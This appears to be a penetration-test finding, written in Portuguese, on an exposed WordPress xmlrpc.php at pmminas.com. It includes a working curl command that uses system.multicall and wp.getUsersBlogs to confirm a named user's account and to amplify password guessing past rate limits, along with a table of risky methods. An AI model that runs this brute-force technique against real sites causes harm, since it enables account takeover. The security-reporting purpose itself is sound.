# F-005 — xmlrpc.php exposto + username válido confirmado + multicall brute force

Alvo: pmminas.com (xmlrpc.php) + 162.241.203.31 (origem real)
Severidade: **BAIXA (final)** — vetor encerrado; ALTA no momento da descoberta
Timestamp: 2026-08-20T03:35:00Z (descoberta); status final 2026-08-20T17:10Z

## Reprodução

```bash
curl -X POST https://pmminas.com/xmlrpc.php -H "Content-Type: text/xml" --data '<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param><value><array><data>
      <value><struct>
        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
        <member><name>params</name><value><array><data>
          <value><string>otavio@pmminas.com</string></value>
          <value><string>password</string></value>
        </data></array></value></member>
      </struct></value>
    </data></array></value></param>
  </params>
</methodCall>'
```

## Output

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <faultCode>403</faultCode>
  <faultString>Nome de usuário ou senha incorretos.</faultString>
</methodResponse>
```

Multicall processa **N logins em 1 único request HTTP** → bypass de rate
limit (cada multicall = N tentativas).

## Confirmação crítica

**Username `otavio@pmminas.com` EXISTE E ESTÁ ATIVO** no WordPress:
- xmlrpc retorna "**Nome de usuário ou senha incorretos**" (pt-BR, mensagem
  padrão WP para creds erradas mas user válido)
- Não retorna "Invalid username" — significa que o user existe

## Métodos perigosos expostos (xmlrpc system.listMethods)

| Método | Risco |
|--------|-------|
| `wp.getUsersBlogs` | Enumera users → confirma username válido |
| `system.multicall` | **Brute force amplificado** (N logins/request) |
| `metaWeblog.newPost` / `metaWeblog.editPost` | RCE via upload (se creds) |
| `metaWeblog.newMediaObject` | Upload arbitrário (se creds) |
| `wp.newComment` | Spam/mass-comment |
| `pingback.ping` / `pingback.extensions.getPingbacks` | SSRF / amplification |
| `wp.getPost` / `wp.getPosts` | Listar posts (se creds) |
